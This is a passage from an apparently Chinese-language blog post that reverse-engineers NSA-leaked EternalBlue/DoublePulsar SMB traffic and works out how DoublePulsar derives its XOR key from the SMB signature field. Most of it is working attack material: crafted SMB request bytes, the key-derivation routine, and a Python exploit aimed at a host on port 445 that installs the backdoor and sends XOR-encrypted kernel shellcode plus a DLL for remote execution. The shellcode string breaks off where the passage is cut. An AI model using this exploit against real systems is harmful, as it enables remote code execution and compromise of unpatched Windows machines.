First_Request&nbsp;=&nbsp;&quot;\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00\x40\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00&quot;</pre><pre class="brush:bash;toolbar:false">#windows系统版本Second_Request&nbsp;=&quot;\x00\x00\x00\x88\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00\x40\x00\x0D\xFF\x00\x88\x00\x04\x11\x0A\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xD4\x00\x00\x00\x4B\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">第三个请求有点问题就是目标ipc主机的ip 因为ip的Length不是固定的所以这里采用chr(len(str_ip))方式来写进NetBIOS&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p7.qhimg.com/t01e7844ed688991f93.png" title="t01c3e9013854106c8b.png" alt="http://p8.qhimg.com/t01c3e9013854106c8b.png" width="1200" height="668" style="height: 668px;"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还有一点就是我们如何自定义ip 这里是UNICODE编码注意下 所以写了一个转Unicode的方法</span></p><pre class="brush:bash;toolbar:false">def&nbsp;make_unicode_host(org_host):host_len&nbsp;=&nbsp;len(org_host)new_host&nbsp;=&nbsp;&quot;&quot;for&nbsp;i&nbsp;in&nbsp;range(host_len):new_host&nbsp;=new_host&nbsp;+&nbsp;&quot;\x00&quot;&nbsp;+&nbsp;org_host[i]return&nbsp;new_host</pre><pre class="brush:bash;toolbar:false">Third_Request&nbsp;=&quot;\x00\x00\x00&quot;+chr(len(str_ip))+&quot;\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x08\x40\x00\x04\xFF\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00\x5C\x00\x5C&quot;+&nbsp;make_unicode_host(HOST)+&quot;\x00\x5C\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00&quot;</pre><pre class="brush:bash;toolbar:false">Fourth_Request&nbsp;=&quot;\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x40\x69\x7A\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">看第五个请求.内容很多看下面的大小是4096个字节猜测smb最多一次就发送4096个字节,下一个请求包和这个请求应该是有联系的。这时候猜测可能就是后门一些操作了 而且这些字符显然是加密的</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p6.qhimg.com/t0193edec9939067780.png" title="t014536ce8c6247611a.png" alt="http://p0.qhimg.com/t014536ce8c6247611a.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看第六个请求:1800个字节,猜测应该是一个文件传输的结束.文件未出现了出现了“85 79 52 a6 85 79 5a 81”这串字符串我们注入的是dll而熟悉PE文件的人应该知道dll的MZ头是</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4D5A,而dll文件是以00 00 00 00 00...结尾。数据包里面没有4D5A这个hex值,推测是把shellcode和dll的hex一块加密大小为 4096+1800&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p6.qhimg.com/t01b63beb6ac5bb86f5.png" title="t0103dc415808950921.png" alt="http://p9.qhimg.com/t0103dc415808950921.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看第六个包设想数据包的加密方式如果是异或那么只要秘钥为7985a15a(小端存储)才能将数据包中的dll尾部数据还原为00 00 00&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t01d9a347ad1d279860.png" title="t01be76ca63ef07c23e.png" alt="http://p5.qhimg.com/t01be76ca63ef07c23e.png"/></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 5px 0;text-indent: 32px"><strong><span style="font-size:16px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:#E36C09">第四步:多次对比数据包定位用户随机秘钥</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有了秘钥那我们用秘钥把前面的shellcode也解密然后再加上我们自己dll再用秘钥加密发送不就可以了么。事实证明也不是这样的密钥是随机生成的</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面提到如果7985a15a是秘钥的话才能将dll尾部数据还原为0 可事实是,每次用NSA工具重现的时候生成的秘钥都是不一样的,而且我也发现个有意思的地方</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当秘钥是7985a15a时工具中给你显示出了这样一段数据</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t01396813dc2a217c67.png" title="t011cd302dd5b839f84.png" alt="http://p5.qhimg.com/t011cd302dd5b839f84.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这正是我们要找的秘钥。它在工具里面显示了,这时候要知道 fb.py这只是个框架,功能都是由他去调用分目录下的脚本,比如说eternalblue 比如说Doublepulsar,也是fb.py的一个框架</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但Doublepulsar不是脚本,它是一个exe,我们就去逆向一下这个exe看看秘钥是怎么计算的</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t01c90d40fd496ab5e5.png" title="t01bb972d4cff005d83.png" alt="http://p3.qhimg.com/t01bb972d4cff005d83.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直接搜索XOR_Key然后ctrlX来到引用处F5</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p8.qhimg.com/t01bde2ed74be6675bd.png" title="t015f2cf63280ad9e39.png" alt="http://p5.qhimg.com/t015f2cf63280ad9e39.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">回溯v21 经过多次复现对比秘钥发现了在第四次的返回包中signature字段发生了变化 其余请求的返回包中的signature字段都为00000000</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p1.qhimg.com/t019cb147f249e8112f.png" title="t01e815bd6b6aed2cce.png" alt="http://p7.qhimg.com/t01e815bd6b6aed2cce.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">读到返回包用py切片return smb_data[18:22]把Signature前四个字节取出 然后转为小端存储&nbsp;struct.unpack(&quot;&lt;I&quot;,get_smb_signature(smb_data))[0]</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就来到了SUB_402F10函数中v21的处理流程 简化了一下程序的处理&nbsp;</span></p><pre class="brush:bash;toolbar:false">x&nbsp;=&nbsp;(2&nbsp;*&nbsp;s&nbsp;^&nbsp;(((s&nbsp;&amp;&nbsp;0xff00&nbsp;|&nbsp;(s&nbsp;&lt;&lt;&nbsp;16))&nbsp;&lt;&lt;&nbsp;8)&nbsp;|&nbsp;(((s&nbsp;&gt;&gt;&nbsp;16)&nbsp;|&nbsp;s&nbsp;&amp;&nbsp;0xff0000)&nbsp;&gt;&gt;&nbsp;8)))
x&nbsp;=&nbsp;x&nbsp;&amp;&nbsp;0xffffffff&nbsp;&nbsp;
得到的x就是工具中显示的XOR_Key&nbsp;:xxxxxx&nbsp;我们还要把他转换成数据包里的秘钥小端变大端&nbsp;key=struct.pack(&quot;&lt;I&quot;,int_key)
最终得到的key就是我们要对shellcode+dll的数据加密解密的秘钥了</pre><pre class="brush:bash;toolbar:false">Seventh_Request=&quot;\x00\x00\x00\x23\xFF\x53\x4D\x42\x71\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00\x00\x00\x00&quot;</pre><pre class="brush:bash;toolbar:false">Eighth_Request=&quot;\x00\x00\x00\x27\xFF\x53\x4D\x42\x74\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00\x02\xFF\x00\x27\x00\x00\x00&quot;</pre><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第五步:构造完整的exploit</span></strong></span></p><pre class="brush:bash;toolbar:false">#!/usr/bin/python
#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-
import&nbsp;socket
import&nbsp;time
import&nbsp;ast
import&nbsp;binascii
import&nbsp;struct
HOST&nbsp;=&#39;192.168.110.128&#39;
PORT&nbsp;=&nbsp;445
dllfile&nbsp;=&nbsp;&quot;x86.dll&quot;
s&nbsp;=&nbsp;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
def&nbsp;Install_Backdoor():
backlog&nbsp;=&nbsp;open(&quot;eternalblue.replay&quot;).read().split(&quot;\n\n&quot;)
backlog&nbsp;=&nbsp;[ast.literal_eval(i)&nbsp;for&nbsp;i&nbsp;in&nbsp;backlog]
connections&nbsp;=&nbsp;[]
start&nbsp;=&nbsp;time.time()
for&nbsp;i&nbsp;in&nbsp;backlog:
delta&nbsp;=&nbsp;i[-1]&nbsp;-&nbsp;(start&nbsp;-&nbsp;time.time())
print(i[0],&nbsp;delta)
if&nbsp;delta&nbsp;&gt;&nbsp;0:
time.sleep(delta)
start&nbsp;=&nbsp;time.time()
if&nbsp;i[0]&nbsp;==&nbsp;&quot;connect&quot;:
sock&nbsp;=&nbsp;socket.socket()
sock.connect((HOST&nbsp;,&nbsp;PORT&nbsp;))
connections.append({&quot;socket&quot;:sock,&quot;stream&quot;&nbsp;:&nbsp;i[1]})
if&nbsp;i[0]&nbsp;==&nbsp;&quot;close&quot;:
[j[&#39;socket&#39;].close()&nbsp;for&nbsp;j&nbsp;in&nbsp;connections&nbsp;if&nbsp;j[&quot;stream&quot;]&nbsp;==&nbsp;i[1]]
if&nbsp;i[0]&nbsp;==&nbsp;&quot;send&quot;:
[j[&#39;socket&#39;].send(i[2])&nbsp;for&nbsp;j&nbsp;in&nbsp;connections&nbsp;if&nbsp;j[&quot;stream&quot;]&nbsp;==&nbsp;i[1]]
if&nbsp;i[0]&nbsp;==&nbsp;&quot;recv&quot;:
[j[&#39;socket&#39;].recv(2048)&nbsp;for&nbsp;j&nbsp;in&nbsp;connections&nbsp;if&nbsp;j[&#39;stream&#39;]&nbsp;==&nbsp;i[1]]
def&nbsp;calculate_doublepulsar_xor_key(s):
&quot;&quot;&quot;Calaculate&nbsp;Doublepulsar&nbsp;Xor&nbsp;Key
&quot;&quot;&quot;
x&nbsp;=&nbsp;(2&nbsp;*&nbsp;s&nbsp;^&nbsp;(((s&nbsp;&amp;&nbsp;0xff00&nbsp;|&nbsp;(s&nbsp;&lt;&lt;&nbsp;16))&nbsp;&lt;&lt;&nbsp;8)&nbsp;|&nbsp;(((s&nbsp;&gt;&gt;&nbsp;16)&nbsp;|&nbsp;s&nbsp;&amp;&nbsp;0xff0000)&nbsp;&gt;&gt;&nbsp;8)))
x&nbsp;=&nbsp;x&nbsp;&amp;&nbsp;0xffffffff&nbsp;&nbsp;#&nbsp;this&nbsp;line&nbsp;was&nbsp;added&nbsp;just&nbsp;to&nbsp;truncate&nbsp;to&nbsp;32&nbsp;bits
return&nbsp;x
def&nbsp;make_unicode_host(org_host):
host_len&nbsp;=&nbsp;len(org_host)
new_host&nbsp;=&nbsp;&quot;&quot;
for&nbsp;i&nbsp;in&nbsp;range(host_len):
new_host&nbsp;=new_host&nbsp;+&nbsp;&quot;\x00&quot;&nbsp;+&nbsp;org_host[i]
return&nbsp;new_host
def&nbsp;get_smb_signature(smb_data):
return&nbsp;smb_data[18:22]
def&nbsp;get_key(smb_data):
smb_sign&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,get_smb_signature(smb_data))[0]
#print&nbsp;&quot;smb_sign:&quot;,&quot;0x%X&quot;%(smb_sign)
int_key&nbsp;=&nbsp;calculate_doublepulsar_xor_key(smb_sign)
print&nbsp;&nbsp;&quot;int_key:&quot;,&quot;0x%X&quot;%(int_key)
key=struct.pack(&quot;&lt;I&quot;,int_key)
#print&nbsp;&quot;key:&quot;,binascii.b2a_hex(key)
return&nbsp;key
def&nbsp;xor_data(org_data&nbsp;,&nbsp;key):
#异或加密
newdata&nbsp;=&nbsp;&quot;&quot;
for&nbsp;i&nbsp;in&nbsp;range(len(org_data)):
newdata&nbsp;+=&nbsp;chr(ord(org_data[i])&nbsp;^&nbsp;ord(key[i%len(key)]))
#print&nbsp;binascii.b2a_hex(newdata)
return&nbsp;newdata
def&nbsp;make_smb_request(send_data&nbsp;,&nbsp;key):
data_len&nbsp;=&nbsp;len(send_data)
array&nbsp;=&nbsp;[]
ncount&nbsp;=&nbsp;data_len&nbsp;/&nbsp;4096
if&nbsp;(data_len&nbsp;%&nbsp;4096)&nbsp;&gt;&nbsp;0:
ncount&nbsp;+=&nbsp;1
make_data&nbsp;=&quot;&quot;
for&nbsp;i&nbsp;in&nbsp;range(ncount):
if&nbsp;i&nbsp;&lt;&nbsp;ncount-1:
smb_Length&nbsp;=&nbsp;struct.pack(&quot;&gt;H&quot;,4096&nbsp;+32&nbsp;+34&nbsp;+&nbsp;12)
#print&nbsp;binascii.b2a_hex(smb_Length)
totalDataCount&nbsp;=&nbsp;struct.pack(&quot;&lt;H&quot;,4096)
byteCount&nbsp;=&nbsp;struct.pack(&quot;&lt;H&quot;,4096&nbsp;+&nbsp;13)
make_data&nbsp;=&nbsp;send_data[i*4096:(i+1)*4096]
else:
smb_Length&nbsp;=&nbsp;struct.pack(&quot;&gt;H&quot;,data_len&nbsp;-&nbsp;4096*i&nbsp;+32&nbsp;+34&nbsp;+&nbsp;12)
totalDataCount&nbsp;=&nbsp;struct.pack(&quot;&lt;H&quot;,data_len&nbsp;-&nbsp;4096*i)
byteCount&nbsp;=&nbsp;struct.pack(&quot;&lt;H&quot;,data_len&nbsp;-&nbsp;4096*i+&nbsp;13)
make_data&nbsp;=&nbsp;send_data[i*4096:]
netBIOS_header&nbsp;=&nbsp;&quot;\x00\x00&quot;+&nbsp;smb_Length
smb_header&nbsp;=&nbsp;&quot;\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00&quot;
transRequest_header&nbsp;=&nbsp;&quot;\x0F\x0C\x00&quot;+&nbsp;totalDataCount&nbsp;+&quot;\x01\x00\x00\x00\x00\x00\x00\x00\xE5\x69\x7A\x00\x00\x00\x0C\x00\x42\x00&quot;+totalDataCount+&quot;\x4E\x00\x01\x00\x0E\x00&quot;+&nbsp;byteCount&nbsp;+&quot;\x00&quot;
data_header&nbsp;=&nbsp;&quot;\x08\x27\x00\x00&quot;+totalDataCount+&quot;\x00\x00\x00&quot;+chr(i*0x10)+&quot;\x00\x00&quot;
print&nbsp;&quot;data_header:&quot;,binascii.b2a_hex(data_header)
print&nbsp;len(data_header)
array.append(netBIOS_header&nbsp;+&nbsp;smb_header&nbsp;+transRequest_header&nbsp;+&nbsp;xor_data(data_header&nbsp;+&nbsp;make_data,key))
return&nbsp;array&nbsp;,&nbsp;ncount
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
#安装后门
Install_Backdoor()
#print&nbsp;&quot;------Install&nbsp;backdoor&nbsp;done!------&quot;
#上传并执行dll
#smb&nbsp;头是32字节&nbsp;请求包50字节&nbsp;，以下一行30字节
#smb版本
step_0_data&nbsp;=&nbsp;&quot;\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00\x40\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00&quot;
s.sendall(step_0_data)
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;0,data
#windows系统版本
step_1_data&nbsp;=&quot;\x00\x00\x00\x88\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00\x40\x00\x0D\xFF\x00\x88\x00\x04\x11\x0A\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xD4\x00\x00\x00\x4B\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00&quot;
s.sendall(step_1_data)
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;1,data
#对方ip地址&nbsp;x.x.x.x
#str_ip&nbsp;=&nbsp;&quot;\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x08\x40\x00\x04\xFF\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00\x5C\x00\x5C&quot;+&nbsp;make_unicode_host(HOST)+&quot;\x00\x5C\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00&quot;
#step_2_data&nbsp;=&quot;\x00\x00\x00&quot;+chr(len(str_ip))+&nbsp;str_ip
step_2_data&nbsp;=&quot;\x00\x00\x00&quot;+chr(len(str_ip))+&quot;\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x08\x40\x00\x04\xFF\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00\x5C\x00\x5C&quot;+&nbsp;make_unicode_host(HOST)+&quot;\x00\x5C\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00&quot;
print&nbsp;binascii.b2a_hex(step_2_data)
print&nbsp;step_2_data
s.sendall(step_2_data)
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;2,data
#验证得到signature
step_3_data&nbsp;=&quot;\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x40\x69\x7A\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
s.sendall(step_3_data)
response&nbsp;=&nbsp;s.recv(1024)
print&nbsp;3,response
#print&nbsp;3,binascii.b2a_hex(response)
key&nbsp;=&nbsp;get_key(response)
#shellcode+dll
kernel_shellcode&nbsp;=&quot;\x8B\x44\x24\x04\x60\x89\xC5\x81\xEC\xB4\x00\x00\x00\x89\xE7\xB8\x10\x00\x00\x00\x89\x87\x9C\x00\x00\x00\xB8\x40\x00\x00\x00\x89\x87\xA0\x00\x00\x00\xB8\x98\x01\x00\x00\x89\x87\xA4\x00\x00\x00\xB8\xBD\xA2\x37\x83\x89\x87\xA8\x00\x00\x00\xB8\x00\x00\x00\x00\x89\x87\xAC\x00\x00\x00\xB8\x00\x00\x00\x00\x89\x87\xB0\x00\x00\x00\xB8\x88\x01\x00\x00\x89\x87\x94\x00\x00\x00\x64\x8B\x1D\x38\x00\x00\x00\x66\x8B\x43\x06\xC1\xE0\x10\x66\x8B\x03\x66\x25\x00\xF0\x8B\x18\x66\x81\xFB\x4D\x5A\x74\x07\x2D\x00\x10\x00\x00\xEB\xF0\x89\x47\x4C\x89\xC3\xB9\x94\x01\x69\xE3\xE8\x8B\x03\x00\x00\x85\xC0\x0F\x84\x8A\x02\x00\x00\x89\x07\xB9\x85\x54\x83\xF0\xE8\x77\x03\x00\x00\x85\xC0\x0F\x84\x76\x02\x00\x00\x89\x47\x04\xB9\x84\x06\xE7\xF9\xE8\x62\x03\x00\x00\x85\xC0\x0F\x84\x61\x02\x00\x00\x89\x47\x08\xB9\xF9\x30\xAC\xA4\xE8\x4D\x03\x00\x00\x85\xC0\x0F\x84\x4C\x02\x00\x00\x89\x47\x0C\xB9\xAE\xB8\x9F\x5D\xE8\x38\x03\x00\x00\x85\xC0\x0F\x84\x37\x02\x00\x00\x89\x47\x10\xB9\xF6\x10\x00\xB8\xE8\x23\x03\x00\x00\x85\xC0\x0F\x84\x22\x02\x00\x00\x89\x47\x14\xB9\xCA\xD6\x5F\xD2\xE8\x0E\x03\x00\x00\x85\xC0\x0F\x84\x0D\x02\x00\x00\x89\x47\x18\xB9\xEE\x88\x6E\x0A\xE8\xF9\x02\x00\x00\x85\xC0\x0F\x84\xF8\x01\x00\x00\x89\x47\x1C\xB9\xCE\x0C\xB5\xDB\xE8\xE4\x02\x00\x00\x85\xC0\x0F\x84\xE3\x01\x00\x00\x89\x47\x20\xB9\x02\xB8\x9B\xD2\xE8\xCF\x02\x00\x00\x85\xC0\x0F\x84\xCE\x01\x00\x00\x89\x47\x24\xB9\x09\x89\x30\xDF\xE8\xBA\x02\x00\x00\x85\xC0\x0F\x84\xB9\x01\x00\x00\x89\x47\x28\xB9\x7D\xE3\x4D\xA0\xE8\xA5\x02\x00\x00\x85\xC0\x0F\x84\xA4\x01\x00\x00\x89\x47\x2C\xB9\xDF\x81\x14\x3E\xE8\x90\x02\x00\x00\x85\xC0\x0F\x84\x8F\x01\x00\x00\x89\x47\x30\xB9\xBA\x1E\x03\xA0\xE8\x7B\x02\x00\x00\x85\xC0\x0F\x84\x7A\x01\x00\x00\x89\x47\x34\xB9\x4F\xFE\xEB\x15\xE8\x66\x02\x00\x00\x85\xC0\x0F\x84\x65\x01\x00\x00\x89\x47\x38\xB9\xCA\xBE\xD0\xEC\xE8\x51\x02\x00\x00\x85\xC0\x0F\x84\x50\x01\x00\x00\x89\x47\x3C\xB9\x79\xA8\x24\x11\xE8\x3C\x02\x00\x00\x85\xC0\x0F\x84\x3B\x01\x00\x00\x89\x47\x40\xB9\x37\xC6\x90\x4F\xE8\x27\x02\x00\x00\x85\xC0\x0F\x84\x26\x01\x00\x00\x89\x47\x44\xB9\x6C\xE7\xFE\x10\xE8\x12\x02\x00\x00\x85\xC0\x0F\x84\x11\x01\x00\x00\x89\x47\x48\xE8\xCF\x01\x00\x00\x8B\x87\x98\x00\x00\x00\x85\xC0\x0F\x84\xFB\x00\x00\x00\xE8\x02\x01\x00\x00\x85\xC0\x0F\x84\xEE\x00\x00\x00\x89\x47\x58\x8D\x8D\x91\x05\x00\x00\xFF\x31\x6A\x40\x68\x00\x10\x00\x00\x51\x6A\x00\xC7\x47\x54\x00\x00\x00\x00\x8D\x4F\x54\x51\x6A\xFF\xFF\x57\x10\x59\x85\xC0\x0F\x85\xB3\x00\x00\x00\x57\x8D\xB5\x95\x05\x00\x00\x8B\x7F\x54\xF3\xA4\x5F\xB8\x3C\x00\x00\x00\x8B\x8F\x94\x00\x00\x00\x03\x4F\x58\x89\xCE\x8B\x11\x39\xD6\x0F\x84\x8C\x00\x00\x00\x2B\x97\x98\x00\x00\x00\x50\x51\x52\x52\xFF\x57\x48\x5A\x59\x85\xC0\x74\x2C\x51\xB9\xA8\x01\x00\x00\x01\xC8\x85\xC9\x59\x74\x06\x8B\x00\x85\xC0\x74\x19\x58\x01\xC2\x50\x31\xC0\x3C\x01\x74\x0A\x8B\x02\x0F\xBA\xE0\x05\x72\x0C\xEB\x05\x80\x3A\x01\x74\x05\x58\x8B\x09\xEB\xB2\x58\x29\xC2\x89\x97\x8C\x00\x00\x00\x6A\x50\x6A\x00\xFF\x17\x85\xC0\x74\x42\x89\x87\x90\x00\x00\x00\xC7\x40\x40\xC2\x14\x00\x00\x6A\x00\x6A\x01\xFF\x77\x54\x6A\x00\x8D\x50\x40\x52\x6A\x00\xFF\xB7\x8C\x00\x00\x00\x50\xFF\x57\x14\x6A\x00\x6A\x00\x6A\x00\xFF\xB7\x90\x00\x00\x00\xFF\x57\x18\x8D\x4F\x5C\x51\xFF\x57\x0C\x8B\x4F\x58\xFF\x57\x3C\x81\xC4\xB4\x00\x00\x00\x61\x31\xC0\xC2\x04\x00\x51\x56\x57\x53\xB9\x08\x00\x00\x00\x51\x8D\x77\x58\x56\x51\xFF\x57\x30\x85\xC0\x0F\x85\x83\x00\x00\x00\x8B\x77\x58\x8B\x9F\xA4\x00\x00\x00\x8B\x04\x1E\x83\xF8\x02\x7C\x6D\x56\xFF\x57\x34\xE8\x6C\x01\x00\x00\x8B\x8F\xA8\x00\x00\x00\x39\xC8\x75\x5A\x8D\x4F\x5C\x51\x56\xFF\x57\x08\x56\xFF\x57\x38\x85\xC0\x74\x3C\x8B\x9F\x9C\x00\x00\x00\x8B\x04\x18\x85\xC0\x74\x2F\x31\xC9\x8B\x9F\xA0\x00\x00\x00\x66\x8B\x0C\x18\x8B\x44\x18\x04\x85\xC0\x74\x1B\x8B\x9F\xB0\x00\x00\x00\x29\xD9\x7C\x11\x01\xC8\xE8\x5F\x01\x00\x00\x8B\x8F\xAC\x00\x00\x00\x39\xC8\x74\x24\xC7\x47\x58\x00\x00\x00\x00\x8D\x4F\x5C\x51\xFF\x57\x0C\x89\xF1\xFF\x57\x3C\x59\x81\xF9\x00\x00\x01\x00\x7F\x0D\x83\xC1\x04\xE9\x5B\xFF\xFF\xFF\x59\x89\xF0\xEB\x02\x31\xC0\x5B\x5F\x5E\x59\xC3\x60\xFF\x57\x44\x89\xC6\x8B\x87\x94\x00\x00\x00\x01\xC6\xFF\x57\x40\x89\xF1\x39\xF0\x77\x14\x8D\x90\x80\x02\x00\x00\x39\xF2\x72\x0A\x29\xC6\x89\xB7\x98\x00\x00\x00\xEB\x06\x8B\x36\x39\xCE\x75\xE2\x61\xC3\x53\x52\x51\x57\x55\x89\xE5\x83\xEC\x18\x89\xCF\x89\xD8\x89\x45\xFC\xE8\x7F\x00\x00\x00\x85\xC0\x74\x6E\x89\x45\xF8\xE8\xF3\x00\x00\x00\x89\x45\xF4\x8B\x45\xFC\x8B\x4D\xF8\xE8\x16\x01\x